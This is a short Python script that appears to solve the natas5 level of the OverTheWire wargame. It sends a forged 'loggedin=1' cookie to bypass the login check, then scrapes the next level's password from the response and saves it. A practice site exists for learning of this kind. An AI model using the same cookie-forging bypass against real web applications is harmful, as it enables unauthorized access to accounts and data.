import requests

url="http://natas5.natas.labs.overthewire.org/"
username="natas5"
# read password from generated file
file=open('password.txt', 'r')
password=file.read()

# Send request and add predefined cookie
response = requests.get(url, auth=(username, password), headers={'Cookie': 'loggedin=1'})

# parse password
str="natas6"
for line in response.text.splitlines():
    if str in line:
        l=line.split()
        passwd=l[7].split('<')
        print(passwd[0])
        with open('password.txt', 'w') as f:
            f.write(passwd[0])
file.close()